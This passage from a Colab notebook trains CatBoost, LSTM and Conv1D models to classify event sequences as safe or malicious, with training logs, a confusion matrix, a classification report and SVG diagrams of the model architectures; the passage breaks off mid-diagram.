            "163:\tlearn: 0.0138934\ttotal: 581ms\tremaining: 128ms\n",
            "164:\tlearn: 0.0135809\ttotal: 584ms\tremaining: 124ms\n",
            "165:\tlearn: 0.0132145\ttotal: 588ms\tremaining: 120ms\n",
            "166:\tlearn: 0.0131130\ttotal: 591ms\tremaining: 117ms\n",
            "167:\tlearn: 0.0130661\ttotal: 594ms\tremaining: 113ms\n",
            "168:\tlearn: 0.0125943\ttotal: 597ms\tremaining: 109ms\n",
            "169:\tlearn: 0.0125140\ttotal: 600ms\tremaining: 106ms\n",
            "170:\tlearn: 0.0123939\ttotal: 603ms\tremaining: 102ms\n",
            "171:\tlearn: 0.0123250\ttotal: 606ms\tremaining: 98.7ms\n",
            "172:\tlearn: 0.0122446\ttotal: 609ms\tremaining: 95.1ms\n",
            "173:\tlearn: 0.0120828\ttotal: 612ms\tremaining: 91.5ms\n",
            "174:\tlearn: 0.0118163\ttotal: 616ms\tremaining: 87.9ms\n",
            "175:\tlearn: 0.0116782\ttotal: 619ms\tremaining: 84.4ms\n",
            "176:\tlearn: 0.0115588\ttotal: 622ms\tremaining: 80.8ms\n",
            "177:\tlearn: 0.0115215\ttotal: 625ms\tremaining: 77.3ms\n",
            "178:\tlearn: 0.0114397\ttotal: 628ms\tremaining: 73.7ms\n",
            "179:\tlearn: 0.0110810\ttotal: 632ms\tremaining: 70.2ms\n",
            "180:\tlearn: 0.0107780\ttotal: 635ms\tremaining: 66.6ms\n",
            "181:\tlearn: 0.0107059\ttotal: 638ms\tremaining: 63.1ms\n",
            "182:\tlearn: 0.0106390\ttotal: 641ms\tremaining: 59.5ms\n",
            "183:\tlearn: 0.0103591\ttotal: 646ms\tremaining: 56.2ms\n",
            "184:\tlearn: 0.0101615\ttotal: 651ms\tremaining: 52.8ms\n",
            "185:\tlearn: 0.0099693\ttotal: 654ms\tremaining: 49.2ms\n",
            "186:\tlearn: 0.0098105\ttotal: 657ms\tremaining: 45.7ms\n",
            "187:\tlearn: 0.0094381\ttotal: 661ms\tremaining: 42.2ms\n",
            "188:\tlearn: 0.0092879\ttotal: 664ms\tremaining: 38.6ms\n",
            "189:\tlearn: 0.0091586\ttotal: 667ms\tremaining: 35.1ms\n",
            "190:\tlearn: 0.0091099\ttotal: 675ms\tremaining: 31.8ms\n",
            "191:\tlearn: 0.0089957\ttotal: 681ms\tremaining: 28.4ms\n",
            "192:\tlearn: 0.0088524\ttotal: 686ms\tremaining: 24.9ms\n",
            "193:\tlearn: 0.0088093\ttotal: 689ms\tremaining: 21.3ms\n",
            "194:\tlearn: 0.0087512\ttotal: 692ms\tremaining: 17.7ms\n",
            "195:\tlearn: 0.0084528\ttotal: 695ms\tremaining: 14.2ms\n",
            "196:\tlearn: 0.0083477\ttotal: 698ms\tremaining: 10.6ms\n",
            "197:\tlearn: 0.0082105\ttotal: 701ms\tremaining: 7.08ms\n",
            "198:\tlearn: 0.0081187\ttotal: 704ms\tremaining: 3.54ms\n",
            "199:\tlearn: 0.0080797\ttotal: 708ms\tremaining: 0us\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<catboost.core.CatBoostRegressor at 0x7eac1cd13880>"
            ]
          },
          "metadata": {},
          "execution_count": 48
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "preds_model_cat=model_cat.predict(val_X_kill)"
      ],
      "metadata": {
        "id": "l4XkqPCXgo3r"
      },
      "execution_count": 49,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "from sklearn.metrics import confusion_matrix\n",
        "score_cat=np.round(np.clip(preds_model_cat, 0,1)).astype('int')\n",
        "mt_cat = confusion_matrix(val_y.astype('int'), score_cat)\n",
        "mt_cat"
      ],
      "metadata": {
        "id": "1J8vPGN8hGTi",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "f493cf48-b1f7-4bc1-b9c1-28abe962f557"
      },
      "execution_count": 50,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array([[14,  2],\n",
              "       [ 0,  0]])"
            ]
          },
          "metadata": {},
          "execution_count": 50
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from sklearn.metrics import precision_recall_curve\n",
        "precision, recall, _ = precision_recall_curve(val_y.astype('int'), score_cat)\n"
      ],
      "metadata": {
        "id": "0h07Ng4iYXbW",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "0fc8ea66-5a47-4ffa-9db7-18cac4613711"
      },
      "execution_count": 51,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.10/dist-packages/sklearn/metrics/_ranking.py:891: UserWarning: No positive class found in y_true, recall is set to one for all thresholds.\n",
            "  warnings.warn(\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from sklearn.metrics import classification_report\n",
        "target_names = ['Безопасное событие', 'Вредоносное событие']\n",
        "print(classification_report(score_cat, val_y.astype('int'), target_names=target_names))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Ap2Vm8J8ZT4M",
        "outputId": "a089536e-2311-49e6-9d60-f7cab6cde9dc"
      },
      "execution_count": 52,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "                     precision    recall  f1-score   support\n",
            "\n",
            " Безопасное событие       0.88      1.00      0.93        14\n",
            "Вредоносное событие       0.00      0.00      0.00         2\n",
            "\n",
            "           accuracy                           0.88        16\n",
            "          macro avg       0.44      0.50      0.47        16\n",
            "       weighted avg       0.77      0.88      0.82        16\n",
            "\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.10/dist-packages/sklearn/metrics/_classification.py:1344: UndefinedMetricWarning: Precision and F-score are ill-defined and being set to 0.0 in labels with no predicted samples. Use `zero_division` parameter to control this behavior.\n",
            "  _warn_prf(average, modifier, msg_start, len(result))\n",
            "/usr/local/lib/python3.10/dist-packages/sklearn/metrics/_classification.py:1344: UndefinedMetricWarning: Precision and F-score are ill-defined and being set to 0.0 in labels with no predicted samples. Use `zero_division` parameter to control this behavior.\n",
            "  _warn_prf(average, modifier, msg_start, len(result))\n",
            "/usr/local/lib/python3.10/dist-packages/sklearn/metrics/_classification.py:1344: UndefinedMetricWarning: Precision and F-score are ill-defined and being set to 0.0 in labels with no predicted samples. Use `zero_division` parameter to control this behavior.\n",
            "  _warn_prf(average, modifier, msg_start, len(result))\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Нейронные сети**"
      ],
      "metadata": {
        "id": "1CARyfh6j-Wx"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import tensorflow as tf\n",
        "from tensorflow import keras\n",
        "\n",
        "BATCH_SIZE = 8\n",
        "SHUFFLE_BUFFER = 100\n",
        "\n",
        "train_Xds = tf.data.Dataset.from_tensor_slices((train_X, train_y)).\\\n",
        "                    shuffle(SHUFFLE_BUFFER).batch(BATCH_SIZE).prefetch(1)\n",
        "val_Xds = tf.data.Dataset.from_tensor_slices((val_X, val_y)).\\\n",
        "                    shuffle(SHUFFLE_BUFFER).batch(BATCH_SIZE).prefetch(1)"
      ],
      "metadata": {
        "id": "dIgyH8CBiMEr"
      },
      "execution_count": 53,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Иницилизация архитектур"
      ],
      "metadata": {
        "id": "DZ6q8r_MrRwG"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def model_simplest(MAX_TIMESTEPS, OH_DIMENSION):\n",
        "    model_simplest = keras.models.Sequential([\n",
        "    keras.layers.LSTM(32, dropout=0.2, recurrent_dropout=0.2, input_shape=[MAX_TIMESTEPS, OH_DIMENSION]),\n",
        "    keras.layers.Dense(units=1, activation='sigmoid')\n",
        "    ])\n",
        "    return model_simplest\n",
        "\n",
        "\n",
        "def model_deep(MAX_TIMESTEPS, OH_DIMENSION):\n",
        "    model = keras.models.Sequential([\n",
        "    keras.layers.LSTM(128, dropout=0.2, recurrent_dropout=0.2, input_shape=[MAX_TIMESTEPS, OH_DIMENSION]),\n",
        "    #keras.layers.Dropout(0.5),\n",
        "    keras.layers.Dense(128, activation='relu'),\n",
        "    #keras.layers.Dropout(0.5),\n",
        "    keras.layers.Dense(16, activation='relu'),\n",
        "    keras.layers.Dense(1, activation='sigmoid')\n",
        "    ])\n",
        "    return model\n",
        "\n",
        "\n",
        "def model_deeper(MAX_TIMESTEPS, OH_DIMENSION):\n",
        "    model = keras.models.Sequential([\n",
        "    keras.layers.LSTM(128, dropout=0.2, recurrent_dropout=0.2,\n",
        "                      input_shape=[MAX_TIMESTEPS, OH_DIMENSION], return_sequences=True),\n",
        "    keras.layers.LSTM(128, dropout=0.2, recurrent_dropout=0.2, input_shape=[MAX_TIMESTEPS, OH_DIMENSION]),\n",
        "    #keras.layers.Dropout(0.5),\n",
        "    keras.layers.Dense(128, activation='relu'),\n",
        "    #keras.layers.Dropout(0.5),\n",
        "    keras.layers.Dense(16, activation='relu'),\n",
        "    keras.layers.Dense(1, activation='sigmoid')\n",
        "    ])\n",
        "    return model\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "def model_conv_rnn(MAX_TIMESTEPS, OH_DIMENSION):\n",
        "    model = keras.models.Sequential([\n",
        "                keras.layers.Conv1D(filters=64, kernel_size=3, activation='relu',\n",
        "                                    input_shape=[MAX_TIMESTEPS, OH_DIMENSION]),\n",
        "                keras.layers.MaxPooling1D(pool_size=2),\n",
        "                keras.layers.LSTM(64),\n",
        "                keras.layers.Dropout(0.5),\n",
        "                keras.layers.Dense(32, activation='relu'),\n",
        "                keras.layers.Dense(1, activation='sigmoid')\n",
        "    ])\n",
        "    return model\n"
      ],
      "metadata": {
        "id": "00lGRoruii4o"
      },
      "execution_count": 54,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "models = { 'simplest': model_simplest(MAX_TIMESTEPS, N),\n",
        "  'deep': model_deep(MAX_TIMESTEPS, N),\n",
        "  'deeper': model_deeper(MAX_TIMESTEPS, N),\n",
        "  'conv1d': model_conv_rnn(MAX_TIMESTEPS, N)}"
      ],
      "metadata": {
        "id": "U3xgQWs2ir7W",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "988460d5-1df9-477e-fcc0-0568a40cd243"
      },
      "execution_count": 55,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "WARNING:tensorflow:Layer lstm will not use cuDNN kernels since it doesn't meet the criteria. It will use a generic GPU kernel as fallback when running on GPU.\n",
            "WARNING:tensorflow:Layer lstm_1 will not use cuDNN kernels since it doesn't meet the criteria. It will use a generic GPU kernel as fallback when running on GPU.\n",
            "WARNING:tensorflow:Layer lstm_2 will not use cuDNN kernels since it doesn't meet the criteria. It will use a generic GPU kernel as fallback when running on GPU.\n",
            "WARNING:tensorflow:Layer lstm_3 will not use cuDNN kernels since it doesn't meet the criteria. It will use a generic GPU kernel as fallback when running on GPU.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Покажем архитектуры"
      ],
      "metadata": {
        "id": "vEkRxffey3hV"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from IPython.display import SVG\n",
        "from keras.utils.vis_utils import model_to_dot\n",
        "for i in models.values():\n",
        "  display (SVG(model_to_dot(i).create(prog='dot', format='svg')))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        },
        "id": "PYwl7FOvwcaV",
        "outputId": "dacc40a2-ac6a-49fc-d6b7-0bb179d65fd0"
      },
      "execution_count": 56,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.SVG object>"
            ],
            "image/svg+xml": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"213pt\" height=\"255pt\" viewBox=\"0.00 0.00 160.00 191.00\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(0.75 0.75) rotate(0) translate(4 187)\">\n<title>G</title>\n<polygon fill=\"white\" stroke=\"transparent\" points=\"-4,4 -4,-187 156,-187 156,4 -4,4\"/>\n<!-- 139277683137056 -->\n<g id=\"node1\" class=\"node\">\n<title>139277683137056</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"0,-146.5 0,-182.5 152,-182.5 152,-146.5 0,-146.5\"/>\n<text text-anchor=\"middle\" x=\"37.5\" y=\"-160.8\" font-family=\"Times,serif\" font-size=\"14.00\">lstm_input</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"75,-146.5 75,-182.5 \"/>\n<text text-anchor=\"middle\" x=\"113.5\" y=\"-160.8\" font-family=\"Times,serif\" font-size=\"14.00\">InputLayer</text>\n</g>\n<!-- 139277683145408 -->\n<g id=\"node2\" class=\"node\">\n<title>139277683145408</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"29,-73.5 29,-109.5 123,-109.5 123,-73.5 29,-73.5\"/>\n<text text-anchor=\"middle\" x=\"49.5\" y=\"-87.8\" font-family=\"Times,serif\" font-size=\"14.00\">lstm</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"70,-73.5 70,-109.5 \"/>\n<text text-anchor=\"middle\" x=\"96.5\" y=\"-87.8\" font-family=\"Times,serif\" font-size=\"14.00\">LSTM</text>\n</g>\n<!-- 139277683137056&#45;&gt;139277683145408 -->\n<g id=\"edge1\" class=\"edge\">\n<title>139277683137056-&gt;139277683145408</title>\n<path fill=\"none\" stroke=\"black\" d=\"M76,-146.31C76,-138.29 76,-128.55 76,-119.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"79.5,-119.53 76,-109.53 72.5,-119.53 79.5,-119.53\"/>\n</g>\n<!-- 139277683142432 -->\n<g id=\"node3\" class=\"node\">\n<title>139277683142432</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"27.5,-0.5 27.5,-36.5 124.5,-36.5 124.5,-0.5 27.5,-0.5\"/>\n<text text-anchor=\"middle\" x=\"51\" y=\"-14.8\" font-family=\"Times,serif\" font-size=\"14.00\">dense</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"74.5,-0.5 74.5,-36.5 \"/>\n<text text-anchor=\"middle\" x=\"99.5\" y=\"-14.8\" font-family=\"Times,serif\" font-size=\"14.00\">Dense</text>\n</g>\n<!-- 139277683145408&#45;&gt;139277683142432 -->\n<g id=\"edge2\" class=\"edge\">\n<title>139277683145408-&gt;139277683142432</title>\n<path fill=\"none\" stroke=\"black\" d=\"M76,-73.31C76,-65.29 76,-55.55 76,-46.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"79.5,-46.53 76,-36.53 72.5,-46.53 79.5,-46.53\"/>\n</g>\n</g>\n</svg>"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.SVG object>"
            ],
            "image/svg+xml": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"232pt\" height=\"449pt\" viewBox=\"0.00 0.00 174.00 337.00\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(0.75 0.75) rotate(0) translate(4 333)\">\n<title>G</title>\n<polygon fill=\"white\" stroke=\"transparent\" points=\"-4,4 -4,-333 170,-333 170,4 -4,4\"/>\n<!-- 139277165437008 -->\n<g id=\"node1\" class=\"node\">\n<title>139277165437008</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"0,-292.5 0,-328.5 166,-328.5 166,-292.5 0,-292.5\"/>\n<text text-anchor=\"middle\" x=\"44.5\" y=\"-306.8\" font-family=\"Times,serif\" font-size=\"14.00\">lstm_1_input</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"89,-292.5 89,-328.5 \"/>\n<text text-anchor=\"middle\" x=\"127.5\" y=\"-306.8\" font-family=\"Times,serif\" font-size=\"14.00\">InputLayer</text>\n</g>\n<!-- 139277683139312 -->\n<g id=\"node2\" class=\"node\">\n<title>139277683139312</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"29.5,-219.5 29.5,-255.5 136.5,-255.5 136.5,-219.5 29.5,-219.5\"/>\n<text text-anchor=\"middle\" x=\"56.5\" y=\"-233.8\" font-family=\"Times,serif\" font-size=\"14.00\">lstm_1</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"83.5,-219.5 83.5,-255.5 \"/>\n<text text-anchor=\"middle\" x=\"110\" y=\"-233.8\" font-family=\"Times,serif\" font-size=\"14.00\">LSTM</text>\n</g>\n<!-- 139277165437008&#45;&gt;139277683139312 -->\n<g id=\"edge1\" class=\"edge\">\n<title>139277165437008-&gt;139277683139312</title>\n<path fill=\"none\" stroke=\"black\" d=\"M83,-292.31C83,-284.29 83,-274.55 83,-265.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.5,-265.53 83,-255.53 79.5,-265.53 86.5,-265.53\"/>\n</g>\n<!-- 139277165433312 -->\n<g id=\"node3\" class=\"node\">\n<title>139277165433312</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"27.5,-146.5 27.5,-182.5 138.5,-182.5 138.5,-146.5 27.5,-146.5\"/>\n<text text-anchor=\"middle\" x=\"58\" y=\"-160.8\" font-family=\"Times,serif\" font-size=\"14.00\">dense_1</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"88.5,-146.5 88.5,-182.5 \"/>\n<text text-anchor=\"middle\" x=\"113.5\" y=\"-160.8\" font-family=\"Times,serif\" font-size=\"14.00\">Dense</text>\n</g>\n<!-- 139277683139312&#45;&gt;139277165433312 -->\n<g id=\"edge2\" class=\"edge\">\n<title>139277683139312-&gt;139277165433312</title>\n<path fill=\"none\" stroke=\"black\" d=\"M83,-219.31C83,-211.29 83,-201.55 83,-192.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.5,-192.53 83,-182.53 79.5,-192.53 86.5,-192.53\"/>\n</g>\n<!-- 139277165434368 -->\n<g id=\"node4\" class=\"node\">\n<title>139277165434368</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"27.5,-73.5 27.5,-109.5 138.5,-109.5 138.5,-73.5 27.5,-73.5\"/>\n<text text-anchor=\"middle\" x=\"58\" y=\"-87.8\" font-family=\"Times,serif\" font-size=\"14.00\">dense_2</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"88.5,-73.5 88.5,-109.5 \"/>\n<text text-anchor=\"middle\" x=\"113.5\" y=\"-87.8\" font-family=\"Times,serif\" font-size=\"14.00\">Dense</text>\n</g>\n<!-- 139277165433312&#45;&gt;139277165434368 -->\n<g id=\"edge3\" class=\"edge\">\n<title>139277165433312-&gt;139277165434368</title>\n<path fill=\"none\" stroke=\"black\" d=\"M83,-146.31C83,-138.29 83,-128.55 83,-119.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.5,-119.53 83,-109.53 79.5,-119.53 86.5,-119.53\"/>\n</g>\n<!-- 139277165435280 -->\n<g id=\"node5\" class=\"node\">\n<title>139277165435280</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"27.5,-0.5 27.5,-36.5 138.5,-36.5 138.5,-0.5 27.5,-0.5\"/>\n<text text-anchor=\"middle\" x=\"58\" y=\"-14.8\" font-family=\"Times,serif\" font-size=\"14.00\">dense_3</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"88.5,-0.5 88.5,-36.5 \"/>\n<text text-anchor=\"middle\" x=\"113.5\" y=\"-14.8\" font-family=\"Times,serif\" font-size=\"14.00\">Dense</text>\n</g>\n<!-- 139277165434368&#45;&gt;139277165435280 -->\n<g id=\"edge4\" class=\"edge\">\n<title>139277165434368-&gt;139277165435280</title>\n<path fill=\"none\" stroke=\"black\" d=\"M83,-73.31C83,-65.29 83,-55.55 83,-46.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.5,-46.53 83,-36.53 79.5,-46.53 86.5,-46.53\"/>\n</g>\n</g>\n</svg>"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.SVG object>"
            ],
            "image/svg+xml": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"232pt\" height=\"547pt\" viewBox=\"0.00 0.00 174.00 410.00\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(0.75 0.75) rotate(0) translate(4 406)\">\n<title>G</title>\n<polygon fill=\"white\" stroke=\"transparent\" points=\"-4,4 -4,-406 170,-406 170,4 -4,4\"/>\n<!-- 139277066415040 -->\n<g id=\"node1\" class=\"node\">\n<title>139277066415040</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"0,-365.5 0,-401.5 166,-401.5 166,-365.5 0,-365.5\"/>\n<text text-anchor=\"middle\" x=\"44.5\" y=\"-379.8\" font-family=\"Times,serif\" font-size=\"14.00\">lstm_2_input</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"89,-365.5 89,-401.5 \"/>\n<text text-anchor=\"middle\" x=\"127.5\" y=\"-379.8\" font-family=\"Times,serif\" font-size=\"14.00\">InputLayer</text>\n</g>\n<!-- 139277165625504 -->\n<g id=\"node2\" class=\"node\">\n<title>139277165625504</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"29.5,-292.5 29.5,-328.5 136.5,-328.5 136.5,-292.5 29.5,-292.5\"/>\n<text text-anchor=\"middle\" x=\"56.5\" y=\"-306.8\" font-family=\"Times,serif\" font-size=\"14.00\">lstm_2</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"83.5,-292.5 83.5,-328.5 \"/>\n<text text-anchor=\"middle\" x=\"110\" y=\"-306.8\" font-family=\"Times,serif\" font-size=\"14.00\">LSTM</text>\n</g>\n<!-- 139277066415040&#45;&gt;139277165625504 -->\n<g id=\"edge1\" class=\"edge\">\n<title>139277066415040-&gt;139277165625504</title>\n<path fill=\"none\" stroke=\"black\" d=\"M83,-365.31C83,-357.29 83,-347.55 83,-338.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.5,-338.53 83,-328.53 79.5,-338.53 86.5,-338.53\"/>\n</g>\n<!-- 139277165444064 -->\n<g id=\"node3\" class=\"node\">\n<title>139277165444064</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"29.5,-219.5 29.5,-255.5 136.5,-255.5 136.5,-219.5 29.5,-219.5\"/>\n<text text-anchor=\"middle\" x=\"56.5\" y=\"-233.8\" font-family=\"Times,serif\" font-size=\"14.00\">lstm_3</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"83.5,-219.5 83.5,-255.5 \"/>\n<text text-anchor=\"middle\" x=\"110\" y=\"-233.8\" font-family=\"Times,serif\" font-size=\"14.00\">LSTM</text>\n</g>\n<!-- 139277165625504&#45;&gt;139277165444064 -->\n<g id=\"edge2\" class=\"edge\">\n<title>139277165625504-&gt;139277165444064</title>\n<path fill=\"none\" stroke=\"black\" d=\"M83,-292.31C83,-284.29 83,-274.55 83,-265.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.5,-265.53 83,-255.53 79.5,-265.53 86.5,-265.53\"/>\n</g>\n<!-- 139277066407456 -->\n<g id=\"node4\" class=\"node\">\n<title>139277066407456</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"27.5,-146.5 27.5,-182.5 138.5,-182.5 138.5,-146.5 27.5,-146.5\"/>\n<text text-anchor=\"middle\" x=\"58\" y=\"-160.8\" font-family=\"Times,serif\" font-size=\"14.00\">dense_4</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"88.5,-146.5 88.5,-182.5 \"/>\n<text text-anchor=\"middle\" x=\"113.5\" y=\"-160.8\" font-family=\"Times,serif\" font-size=\"14.00\">Dense</text>\n</g>\n<!-- 139277165444064&#45;&gt;139277066407456 -->\n<g id=\"edge3\" class=\"edge\">\n<title>139277165444064-&gt;139277066407456</title>\n<path fill=\"none\" stroke=\"black\" d=\"M83,-219.31C83,-211.29 83,-201.55 83,-192.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.5,-192.53 83,-182.53 79.5,-192.53 86.5,-192.53\"/>\n</g>\n<!-- 139277066404528 -->\n<g id=\"node5\" class=\"node\">\n<title>139277066404528</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"27.5,-73.5 27.5,-109.5 138.5,-109.5 138.5,-73.5 27.5,-73.5\"/>\n<text text-anchor=\"middle\" x=\"58\" y=\"-87.8\" font-family=\"Times,serif\" font-size=\"14.00\">dense_5</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"88.5,-73.5 88.5,-109.5 \"/>\n<text text-anchor=\"middle\" x=\"113.5\" y=\"-87.8\" font-family=\"Times,serif\" font-size=\"14.00\">Dense</text>\n</g>\n<!-- 139277066407456&#45;&gt;139277066404528 -->\n<g id=\"edge4\" class=\"edge\">\n<title>139277066407456-&gt;139277066404528</title>\n<path fill=\"none\" stroke=\"black\" d=\"M83,-146.31C83,-138.29 83,-128.55 83,-119.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.5,-119.53 83,-109.53 79.5,-119.53 86.5,-119.53\"/>\n</g>\n<!-- 139277066413264 -->\n<g id=\"node6\" class=\"node\">\n<title>139277066413264</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"27.5,-0.5 27.5,-36.5 138.5,-36.5 138.5,-0.5 27.5,-0.5\"/>\n<text text-anchor=\"middle\" x=\"58\" y=\"-14.8\" font-family=\"Times,serif\" font-size=\"14.00\">dense_6</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"88.5,-0.5 88.5,-36.5 \"/>\n<text text-anchor=\"middle\" x=\"113.5\" y=\"-14.8\" font-family=\"Times,serif\" font-size=\"14.00\">Dense</text>\n</g>\n<!-- 139277066404528&#45;&gt;139277066413264 -->\n<g id=\"edge5\" class=\"edge\">\n<title>139277066404528-&gt;139277066413264</title>\n<path fill=\"none\" stroke=\"black\" d=\"M83,-73.31C83,-65.29 83,-55.55 83,-46.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.5,-46.53 83,-36.53 79.5,-46.53 86.5,-46.53\"/>\n</g>\n</g>\n</svg>"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.SVG object>"
            ],
            "image/svg+xml": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"281pt\" height=\"644pt\" viewBox=\"0.00 0.00 211.00 483.00\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(0.75 0.75) rotate(0) translate(4 479)\">\n<title>G</title>\n<polygon fill=\"white\" stroke=\"transparent\" points=\"-4,4 -4,-479 207,-479 207,4 -4,4\"/>\n<!-- 139277067340288 -->\n<g id=\"node1\" class=\"node\">\n<title>139277067340288</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"17.5,-438.5 17.5,-474.5 185.5,-474.5 185.5,-438.5 17.5,-438.5\"/>\n<text text-anchor=\"middle\" x=\"63\" y=\"-452.8\" font-family=\"Times,serif\" font-size=\"14.00\">conv1d_input</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"108.5,-438.5 108.5,-474.5 \"/>\n<text text-anchor=\"middle\" x=\"147\" y=\"-452.8\" font-family=\"Times,serif\" font-size=\"14.00\">InputLayer</text>\n</g>\n<!-- 139277066417296 -->\n<g id=\"node2\" class=\"node\">\n<title>139277066417296</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"42.5,-365.5 42.5,-401.5 160.5,-401.5 160.5,-365.5 42.5,-365.5\"/>\n<text text-anchor=\"middle\" x=\"70.5\" y=\"-379.8\" font-family=\"Times,serif\" font-size=\"14.00\">conv1d</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"98.5,-365.5 98.5,-401.5 \"/>\n<text text-anchor=\"middle\" x=\"129.5\" y=\"-379.8\" font-family=\"Times,serif\" font-size=\"14.00\">Conv1D</text>\n</g>\n<!-- 139277067340288&#45;&gt;139277066417296 -->\n<g id=\"edge1\" class=\"edge\">\n<title>139277067340288-&gt;139277066417296</title>\n<path fill=\"none\" stroke=\"black\" d=\"M101.5,-438.31C101.5,-430.29 101.5,-420.55 101.5,-411.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"105,-411.53 101.5,-401.53 98,-411.53 105,-411.53\"/>\n</g>\n<!-- 139277066969648 -->\n<g id=\"node3\" class=\"node\">\n<title>139277066969648</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"0,-292.5 0,-328.5 203,-328.5 203,-292.5 0,-292.5\"/>\n<text text-anchor=\"middle\" x=\"51\" y=\"-306.8\" font-family=\"Times,serif\" font-size=\"14.00\">max_pooling1d</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"102,-292.5 102,-328.5 \"/>\n<text text-anchor=\"middle\" x=\"152.5\" y=\"-306.8\" font-family=\"Times,serif\" font-size=\"14.00\">MaxPooling1D</text>\n</g>\n<!-- 139277066417296&#45;&gt;139277066969648 -->\n<g id=\"edge2\" class=\"edge\">\n<title>139277066417296-&gt;139277066969648</title>\n<path fill=\"none\" stroke=\"black\" d=\"M101.5,-365.31C101.5,-357.29 101.5,-347.55 101.5,-338.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"105,-338.53 101.5,-328.53 98,-338.53 105,-338.53\"/>\n</g>\n<!-- 139277066819840 -->\n<g id=\"node4\" class=\"node\">\n<title>139277066819840</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"48,-219.5 48,-255.5 155,-255.5 155,-219.5 48,-219.5\"/>\n<text text-anchor=\"middle\" x=\"75\" y=\"-233.8\" font-family=\"Times,serif\" 